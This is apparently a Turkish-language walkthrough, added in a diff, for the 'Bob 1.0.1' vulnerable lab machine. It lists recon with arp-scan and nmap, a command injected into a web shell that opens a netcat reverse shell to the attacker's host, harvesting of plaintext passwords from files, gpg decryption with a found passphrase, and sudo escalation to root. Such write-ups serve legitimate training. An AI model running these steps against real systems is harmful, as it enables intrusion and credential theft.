@@ -1,0 +1,12 @@
+BOB 1.0.1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.117 bulundu.
+2 - nmap -A 192.168.2.117
+3 - http://192.168.2.117/robots.txt
+4 - http://192.168.2.117/dev_shell.php
+5 - whoami | nc -e /bin/bash 192.168.2.128 4444
+6 - cd /home/elliot, cat theadminisdumb.txt, james:Qwerty, elliot:theadminisdumb
+7 - su jc
+8 - cd /home/bob/Documents, cat notes.sh -> HARPOCRATES : gpg pass
+9 - gpg --batch --passphrase HARPOCRATES --decrypt login.txt.gpg, bob:b0bcat_
+10 - su bob
+11 - sudo -l, sudo su
